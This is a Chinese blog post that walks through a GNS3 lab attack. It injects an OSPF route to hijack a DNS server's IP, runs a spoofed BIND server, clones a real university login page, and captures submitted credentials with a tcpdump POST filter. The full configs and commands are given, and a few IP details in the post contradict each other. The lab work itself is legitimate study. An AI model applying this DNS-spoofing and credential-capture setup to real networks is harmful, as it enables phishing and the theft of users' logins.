---
title: OSPF 模拟入侵测试4-劫持DNS服务器IP
date: 2016/7/18 14:33:46 
description: OSPF 模拟入侵测试4-劫持DNS服务器IP
categories: 技术
tags: [ospf,network]
---

### 1. 实验环境

####  实验拓扑

使用GNS3搭建实验拓扑，实验拓扑如图1-1所示，其中R1、R2为OSPF网络，CentOS_Fun为入侵主机，模拟路由器，PC3模拟一个DNS服务器，IP地址为210.76.211.7/24。CentOS7_Fun同时运行HTTP服务，DNS服务。此时假设条件如下：

- CentOS7直接获取了所有DNS服务器的流量，并冒充该DNS服务器
- 假设CentOS7_Fun的IP地址为30.30.30.2的IP为正常网页服务器
- 假设CentOS7_Fun的IP地址为210.76.211.7对应的IP为中间人攻击网页服务器
- 假设正确网页服务器域名为test.edu.cn，对应IP为30.30.30.2。

<center> ![1-1](http://qingdao.icean.cc:11234/Imgbed/OSPF_模拟入侵测试4_DNS服务器伪装/1-1.jpg)</center><center style="color:purple">**图1-1 实验拓扑**</center>

####  IP地址表

| 设备          | 端口     | IPv4地址               | IPv6地址                |
| ----------- | ------ | -------------------- | --------------------- |
| Gateway     | f0/0   | 10.10.10.253/24      | 2001:10:10:10::253/64 |
|             | lo0    | 1.1.1.1/32           | 2001:1:1:1::1/64      |
| R2          | f1/0   | 10.10.10.254/24      | 2001:10:10:10::254/64 |
|             | f0/0   | 20.20.20.1/24        | 2001:20:20:20::1/64   |
| R1          | f1/0   | 30.30.30.254/24      | 2001:30:30:30::254/64 |
|             | f0/0   | 20.20.20.2/24        | 2001:20:20:20::2/64   |
|             | f1/1   | 210.76.211.254/24    | /                     |
| CentOS7_fun | enp0s3 | 30.30.30.2/24        | eui-64                |
|             | enp0s9 | 210.76.211.7/24      | eui-64                |
| Winxp2      | e2     | 30.30.30.1/24 (DHCP) | eui-64                |
| DNS服务器      | e0     | 210.76.211.7/24      | /                     |

####  路由器配置 

配置不变，与《OSPF 模拟入侵测试2-指定主机欺骗》中配置一样。

----------

### 2. 伪造DNS

####  DNS服务搭建

安装相关服务

```shell
yum install -y bind*
```

配置/etc/named.conf

修改配置如下

```shell
options {
    listen-on port 53 { any; };
    listen-on-v6 port 53 { any; };
    directory   "/var/named";
    dump-file   "/var/named/data/cache_dump.db";
    statistics-file "/var/named/data/named_stats.txt";
    memstatistics-file "/var/named/data/named_mem_stats.txt";
    allow-query     { any; };

    recursion no; 
    dnssec-enable yes;
    dnssec-validation yes;

    /* Path to ISC DLV key */
    bindkeys-file "/etc/named.iscdlv.key";

    managed-keys-directory "/var/named/dynamic";

    pid-file "/run/named/named.pid";
    session-keyfile "/run/named/session.key";
};

logging {
        channel default_debug {
                file "data/named.run";
                severity dynamic;
        };
};
zone "." IN {
    type hint;
    file "named.ca";
};
zone "edu.cn" IN {
    type master;
    file "named.edu.cn";
};
```

添加数据文件

```shell
$TTL 600
@ IN SOA dns.edu.cn. admin.edu.cn. (2011080401 3H 15M 1W 1D) 
@ IN NS dns.edu.cn.
dns.edu.cn. IN A 210.76.211.1
                                                                                                                                 
test.edu.cn. IN A 210.76.211.7  #将正确域名指向伪装http服务器
test2.edu.cn. IN A 30.30.30.2    #将正确http授予一个类似域名。
```

启动named服务，并开启iptables相关选项。

---

### 3. 抓取数据

####  注入路由 

在Vigilante上注入路由如下，将本来到PC3的流量引到CentOS7_Fun的enp0s9上，包括DNS流量。

```css
ip route 210.76.211.7/32 enp0s9
```

####  网页修改

- 下载sep.ucas.edu.cn的登录主页，并把其中的名称修改为为index.html，其配置文件夹的名称也改为英文 。下载到210.76.211.7（伪造http服务器，IP为210.76.211.1，域名为test.edu.cn）
- 修改网页跳转，选择跳转正确的网页服务器（IP为30.30.30.2，域名为test2.edu.cn），
- 这里为了节省资源，使用了一台主机的两张网卡分别扮演正确的网页服务器和伪造网页服务器。

```
DirectoryIndex index.html
```


####  tcpdump抓取POST请求

tcpdump抓post语句如下所示

```
tcpdump -i enp0s3 'host 210.76.211.7 and port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354' -w sep+.cap
```

其中0x504f5354意义为，代表POST

```
P=0x50
O=0x4f
S=0x53
T=0x54
```

####  读取结果 

讲读取文件结果使用sftp传输到本机，使用Wireshark打开抓去的POST结果。
